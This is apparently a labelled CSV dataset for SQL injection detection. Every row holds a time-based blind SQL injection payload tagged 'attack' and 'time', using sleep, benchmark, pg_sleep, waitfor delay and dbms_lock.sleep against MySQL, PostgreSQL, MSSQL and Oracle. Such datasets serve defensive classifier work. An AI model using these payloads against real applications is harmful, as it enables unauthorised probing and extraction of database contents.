label,payload,family
attack,"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'fele'  =  'fele",time
attack,1  )   where 2199  =  2199 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,time
attack,1'+  (  select 'hplm' where 4008  =  4008 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,time
attack,1 rlike sleep  (  5  )  #,time
attack,1%'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   '%'  =  ',time
attack,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'zqiw'  =  'zqiw,time
attack,"1"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1'||  (  select 'bsbv' from dual where 5276  =  5276 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   ||',time
attack,"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""%""  =  """,time
attack,"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",time
attack,"1""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1"" and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,begin if   (  5624  =  5624  )   then dbms_lock.sleep  (  5  ) ,time
attack,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",time
attack,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1'   )    )    as jxvv where 6593  =  6593 or elt  (  6272  =  6272,sleep  (  5   )    )   --",time
attack,"1"" where 1831  =  1831 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  8126  =  8126",time
attack,1'+  (  select uhsy where 4596  =  4596 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   +',time
attack,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'hokd'  =  'hokd,time
attack,"1'  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""grct""  =  ""grct",time
attack,"1"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and ""cxsu"" like ""cxsu",time
attack,"1""   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   7805  =  7805,time
attack,1'+  (  select 'sfko' where 6853  =  6853 rlike sleep  (  5  )  #,time
attack,1'||  (  select 'xqqp' where 3007  =  3007 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,1' in boolean mode  )   rlike sleep  (  5  )  #,time
attack,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",time
attack,select pg_sleep  (  5  )   and 'zfyy'  =  'zfyy,time
attack,1  )   as rlft where 1670  =  1670 waitfor delay '0:0:5'--,time
attack,"1""  )   as tnux where 4888  =  4888 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",time
attack,"1"" where 2677  =  2677 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",time
attack,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   -- rlas",time
attack,"select pg_sleep  (  5  )   and ""%""  =  """,time
attack,select sleep  (  5   )    )   ||',time
attack,"1"" where 5796  =  5796 and sleep  (  5  )  #",time
attack,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,"1 where 8074  =  8074 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1'  )   and sleep  (  5  )   and   (  'njud'  =  'njud,time
attack,"1""   )    )    as aozi where 3354  =  3354 waitfor delay '0:0:5'--",time
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,time
attack,"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",time
attack,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'ineq' like 'ineq,time
attack,"1""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1'  )   or sleep  (  5  ) ,time
attack,"1"" rlike sleep  (  5  )  #",time
attack,1'  )   where 8776  =  8776 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,time
attack,select sleep  (  5  ) ,time
attack,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,time
attack,"1""  )   where 6843  =  6843 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",time
attack,select sleep  (  5  )   and    (    (   'ilcv'  =  'ilcv,time
attack,1' in boolean mode  )   or sleep  (  5  )  #,time
attack,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""fzlr""  =  ""fzlr",time
attack,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,time
attack,"1%""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  ""%""  =  """,time
attack,"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",time
attack,"1%""   )    )     )   or sleep  (  5  )   and    (    (     (  ""%""  =  """,time
attack,1 where 8180  =  8180 or sleep  (  5  )  #,time
attack,"1%""   )    )     )   and sleep  (  5  )  #",time
attack,1%'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""ilge"" like ""ilge",time
attack,"1%'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  '%'  =  '",time
attack,1'+  (  select qpaf where 7859  =  7859 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +',time
attack,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",time
attack,select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,time
attack,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",time
attack,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",time
attack,1'+  (  select 'zjvx' where 4683  =  4683 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',time
attack,"1%'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  '%'  =  '",time
attack,1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,1%'   )    )    and sleep  (  5  )  #,time
attack,"1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",time
attack,1' where 1153  =  1153 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,time
attack,"1""  )   where 6236  =  6236 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'eqfh'  =  'eqfh,time
attack,"1%""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""%""  =  """,time
attack,"1%"" waitfor delay '0:0:5' and ""%""  =  """,time
attack,1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'acml' like 'acml,time
attack,"1""  )   as rdvm where 6360  =  6360 and sleep  (  5  )  --",time
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",time
attack,1'  )   as irnj where 7274  =  7274 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,time
attack,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",time
attack,"1   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1  )   waitfor delay '0:0:5'--,time
attack,"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""sdps""  =  ""sdps",time
attack,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",time
attack,"1'||  (  select 'ymac' from dual where 9268  =  9268 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  ||'",time
attack,"1%""  )   rlike sleep  (  5  )  #",time
attack,"1' in boolean mode  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   #",time
attack,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"select sleep  (  5  )   and   (  ""tlbj"" like ""tlbj",time
attack,"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""ubvd""  =  ""ubvd",time
attack,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'cmqe' like 'cmqe,time
attack,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )   ",time
attack,1  )   rlike sleep  (  5  )   and   (  5724  =  5724,time
attack,1   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   3069  =  3069,time
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",time
attack,"1' where 3339  =  3339 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",time
attack,1%'   )    )    rlike sleep  (  5  )   and    (    (   '%'  =  ',time
attack,"1""   )    )    as zval where 2255  =  2255 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'egnv' like 'egnv",time
attack,1'+  (  select 'mdxt' where 2733  =  2733 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,time
attack,select pg_sleep  (  5  )   and    (    (   4382  =  4382,time
attack,1 rlike sleep  (  5  )  -- muhp,time
attack,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  -- saxs,time
attack,1  )   as cinw where 3732  =  3732 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )     )  +'",time
attack,1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'yqbo'  =  'yqbo,time
attack,1'+  (  select shec where 3589  =  3589 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',time
attack,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'brob'  =  'brob,time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'kerg' like 'kerg,time
attack,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,time
attack,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,time
attack,"1""   )    )    as ndbk where 5042  =  5042 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",time
attack,select pg_sleep  (  5  )   and   (  '%'  =  ',time
attack,"1'+  (  select 'kqnj' where 9483  =  9483 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and '%'  =  ',time
attack,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  7015  =  7015,time
attack,1'   )    )    as cpwx where 5378  =  5378 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,1  )   where 7956  =  7956 or sleep  (  5  )  #,time
attack,"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'ayjb' like 'ayjb",time
attack,"1   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   8189  =  8189",time
attack,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,time
attack,1'||  (  select 'jmhb' where 1794  =  1794 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"1' where 7464  =  7464 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1""  )   as mszg where 6184  =  6184 rlike sleep  (  5  )  --",time
attack,"1"" rlike sleep  (  5  )  ",time
attack,"select pg_sleep  (  5  )   and ""zhsc""  =  ""zhsc",time
attack,1'  )   as pxcd where 9754  =  9754 or sleep  (  5  )  --,time
attack,"1""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  ""jref"" like ""jref",time
attack,1%' and sleep  (  5  )  #,time
attack,"1  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1""  )   as gjlv where 1983  =  1983 and sleep  (  5  )  #",time
attack,1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,1%'   )    )     )   waitfor delay '0:0:5'--,time
attack,1' where 4473  =  4473 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,"1%' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '%'  =  '",time
attack,1%'   )    )     )   or sleep  (  5  )   and    (    (     (  '%'  =  ',time
attack,"waitfor delay '0:0:5' and   (  ""%""  =  """,time
attack,"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",time
attack,1   )    )    as uvep where 6016  =  6016 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,time
attack,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'vpqr'  =  'vpqr,time
attack,"1',  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",time
attack,"1""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""cowu"" like ""cowu",time
attack,1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,time
attack,select sleep  (  5   )    )   +',time
attack,"1%""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",time
attack,1 where 7452  =  7452 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'ecur'  =  'ecur,time
attack,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""afby""  =  ""afby",time
attack,"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  1773  =  1773",time
attack,1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,1' where 7828  =  7828 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"1"" where 6200  =  6200 and elt  (  1210  =  1210,sleep  (  5   )    )   --",time
attack,1%'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'obeh'  =  'obeh",time
attack,"1'  )   where 6731  =  6731 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,time
attack,select pg_sleep  (  5  )   and   (  1044  =  1044,time
attack,1 where 9620  =  9620 waitfor delay '0:0:5'--,time
attack,"1' where 4334  =  4334 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1%""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1   )    )    as kiqk where 7366  =  7366 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,time
attack,1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,time
attack,1' in boolean mode  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,1 or sleep  (  5  ) ,time
attack,1'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  'mzqi'  =  'mzqi,time
attack,"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",time
attack,1'||  (  select 'sbip' from dual where 7302  =  7302 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   ||',time
attack,1'||  (  select 'bwqc' from dual where 6897  =  6897 and sleep  (  5  )  #,time
attack,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,time
attack,1'  )   rlike sleep  (  5  ) ,time
attack,waitfor delay '0:0:5' and   (  'eaxu'  =  'eaxu,time
attack,1'  )   where 4364  =  4364 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"1 where 8390  =  8390 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",time
attack,"select pg_sleep  (  5  )   and    (    (     (  ""%""  =  """,time
attack,1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl,time
attack,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   # irvm",time
attack,"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",time
attack,"1""  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1'  )   and sleep  (  5  )   and   (  'orxt'  =  'orxt,time
attack,1'+  (  select ejaj where 1651  =  1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',time
attack,"1'  )   as wnys where 6457  =  6457 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1""  )   as eefe where 5290  =  5290 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",time
attack,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,1'   )    )     )   or sleep  (  5  )  #,time
attack,1' where 8482  =  8482 or sleep  (  5  )  #,time
attack,1'||  (  select 'ocmk' from dual where 3961  =  3961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',time
attack,1'+  (  select ukwc where 3008  =  3008 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,1  )   and sleep  (  5  )   and   (  4855  =  4855,time
attack,"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1'||  (  select 'homm' where 4937  =  4937 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  6824  =  6824,time
attack,1  )   as crsd where 5271  =  5271 waitfor delay '0:0:5'--,time
attack,1%'   )    )     )   rlike sleep  (  5  )   and    (    (     (  '%'  =  ',time
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",time
attack,"1""   )    )    or sleep  (  5  )   and    (    (   ""mcyv""  =  ""mcyv",time
attack,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',time
attack,"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""rsru""  =  ""rsru",time
attack,"1"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1'+  (  select aahc where 5436  =  5436 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  +'",time
attack,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )   ",time
attack,"1%' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '%'  =  '",time
attack,1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,"1%""   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  ""%""  =  """,time
attack,"1""   )    )    or sleep  (  5  )  #",time
attack,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",time
attack,1'+  (  select 'iify' where 6257  =  6257 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',time
attack,"1"" where 3329  =  3329 or sleep  (  5  )  --",time
attack,"1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",time
attack,"1"" where 3990  =  3990 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",time
attack,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,time
attack,"1   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   8280  =  8280",time
attack,1   )    )    as uadn where 9588  =  9588 rlike sleep  (  5  )  #,time
attack,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  4968  =  4968,time
attack," select sleep  (  5  )   and    (    (   ""wueo""  =  ""wueo",time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   4982  =  4982,time
attack,select sleep  (  5  )   and    (    (   8679  =  8679,time
attack,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""jenb"" like ""jenb",time
attack,"1"" where 9521  =  9521 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",time
attack,"1  )   where 4226  =  4226 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1  )   where 4600  =  4600 or sleep  (  5  )  --,time
attack,1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""azzv"" like ""azzv",time
attack,1 where 7299  =  7299 rlike sleep  (  5  )  --,time
attack,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'svwr'  =  'svwr,time
attack,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""hiwo"" like ""hiwo",time
attack,1'+  (  select iowv where 6105  =  6105 and sleep  (  5  )  #,time
attack,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,time
attack,waitfor delay '0:0:5' and    (    (   'yjsp' like 'yjsp,time
attack,"1%'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  '%'  =  '",time
attack,"1""  )   rlike sleep  (  5  )   and   (  ""efoq"" like ""efoq",time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   '%'  =  ',time
attack,"1 where 5401  =  5401 and elt  (  1210  =  1210,sleep  (  5   )    )   --",time
attack,"1%'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  '%'  =  '",time
attack,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,time
attack,1  )   where 1203  =  1203 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""hvic"" like ""hvic",time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,time
attack,1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,time
attack,"1%"" and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  9847  =  9847",time
attack,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   ",time
attack,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",time
attack,"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",time
attack,"1%""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""%""  =  """,time
attack,"1'  )   as vlwh where 9403  =  9403 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'ljhc'  =  'ljhc,time
attack,"waitfor delay '0:0:5' and ""lhcv""  =  ""lhcv",time
attack,1%' waitfor delay '0:0:5'--,time
attack,"1' where 7080  =  7080 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1'  )   as jztg where 1222  =  1222 or sleep  (  5  )  #,time
attack,"1%""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""%""  =  """,time
attack,"1"" waitfor delay '0:0:5'--",time
attack,1%'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,1%' and sleep  (  5  )   and '%'  =  ',time
attack,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",time
attack,"1"" or sleep  (  5  )  ",time
attack,1   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  3919  =  3919,time
attack,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',time
attack,1  )   as xwgf where 4204  =  4204 and sleep  (  5  )  --,time
attack,"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",time
attack,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,1%'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  '%'  =  ',time
attack,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""cadh"" like ""cadh",time
attack,1  )   where 6950  =  6950 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,time
attack,select sleep  (  5  )   and 'beuk'  =  'beuk,time
attack,"1%""   )    )    waitfor delay '0:0:5'--",time
attack,1'||  (  select 'wszt' from dual where 6854  =  6854 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',time
attack,1 and sleep  (  5  )  # qcyj,time
attack,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,time
attack,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",time
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",time
attack,1   )    )     )   or sleep  (  5  )  #,time
attack,1'+  (  select mrdi where 7451  =  7451 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,waitfor delay '0:0:5'# ogzq,time
attack,"1""  )   where 6821  =  6821 waitfor delay '0:0:5'--",time
attack,1  )   and sleep  (  5  )  #,time
attack,1'  )   waitfor delay '0:0:5' and   (  'peyv' like 'peyv,time
attack,1' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"1"" where 2547  =  2547 or sleep  (  5  )  #",time
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",time
attack,select sleep  (  5  )   and   (  1435  =  1435,time
attack,"1%""  )   waitfor delay '0:0:5'--",time
attack,"1'  )   as khaa where 8157  =  8157 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  6556  =  6556",time
